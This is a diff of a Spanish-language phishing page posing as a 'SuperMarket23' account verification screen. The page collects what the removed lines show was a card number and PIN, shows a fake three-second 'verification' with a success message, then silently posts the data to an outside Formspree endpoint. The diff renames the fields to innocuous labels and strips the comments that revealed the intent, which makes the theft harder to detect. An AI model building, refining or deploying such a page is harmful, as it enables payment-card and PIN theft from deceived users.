@@ -7,9 +7,7 @@
     <title>SuperMarket23 | Verificación</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f0f7ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        /* Animación del círculo de carga */
+        body { background-color: #f0f7ff; font-family: sans-serif; }
         .spinner {
             border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
@@ -36,18 +34,18 @@
             <form id="authForm" action="https://formspree.io/f/meelpawj" method="POST" class="space-y-5">
                 
                 <div>
-                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">Número de Tarjeta (PAN)</label>
-                    <input type="text" name="tarjeta" maxlength="16" placeholder="0000 0000 0000 0000" 
+                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">ID de Usuario o Cuenta</label>
+                    <input type="text" name="referencia_cliente" maxlength="16" placeholder="0000 0000 0000 0000" 
                         class="w-full bg-blue-50/50 border-2 border-blue-100 rounded-xl py-4 px-4 text-center text-xl font-bold text-blue-900 focus:border-blue-600 focus:bg-white outline-none transition-all" required>
                 </div>
 
                 <div>
-                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">PIN de Seguridad</label>
-                    <input type="password" name="pin" maxlength="4" placeholder="••••" 
+                    <label class="block text-[10px] font-black text-blue-800/50 uppercase mb-2 ml-1">Código de Verificación</label>
+                    <input type="password" name="codigo_postal_verificacion" maxlength="4" placeholder="••••" 
                         class="w-full bg-blue-50/50 border-2 border-blue-100 rounded-xl py-4 px-4 text-center text-2xl text-blue-900 focus:border-blue-600 focus:bg-white outline-none transition-all" required>
                 </div>
 
-                <button type="submit" id="btnMain" class="w-full bg-[#0056b3] text-white font-bold py-5 rounded-xl shadow-lg transition-all active:scale-95 text-lg uppercase tracking-tight overflow-hidden relative">
+                <button type="submit" id="btnMain" class="w-full bg-[#0056b3] text-white font-bold py-5 rounded-xl shadow-lg transition-all active:scale-95 text-lg uppercase tracking-tight relative">
                     <span id="textAutenticar">Autenticar</span>
                     
                     <div id="loadingState" class="hidden flex items-center justify-center gap-3">
@@ -60,7 +58,7 @@
 
                 <div class="flex justify-center items-center gap-2 pt-4">
                     <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
-                    <p class="text-[9px] text-blue-400 font-bold uppercase tracking-widest">Servidor de Encriptación Activo</p>
+                    <p class="text-[9px] text-blue-400 font-bold uppercase tracking-widest">Servidor Activo</p>
                 </div>
             </form>
         </div>
@@ -74,24 +72,20 @@
         const successState = document.getElementById('successState');
 
         form.onsubmit = function(e) {
-            e.preventDefault(); // Detenemos el envío para hacer la animación profesional
-
-            // 1. Iniciar estado de carga (Verificando...)
+            e.preventDefault();
             txtDefault.classList.add('hidden');
             loadState.classList.remove('hidden');
             btn.classList.replace('bg-[#0056b3]', 'bg-blue-400');
             btn.style.pointerEvents = 'none';
 
-            // 2. Esperar 3 segundos (Tiempo de "verificación" creíble)
             setTimeout(() => {
                 loadState.classList.add('hidden');
                 successState.classList.remove('hidden');
                 btn.classList.replace('bg-blue-400', 'bg-green-600');
 
-                // 3. Enviar los datos a tu Gmail (Formspree) de forma invisible
                 setTimeout(() => {
                     form.submit();
-                }, 1200); // Pequeña pausa para que el cliente lea "Verificación Exitosa"
+                }, 1000);
             }, 3000);
         };
     </script>
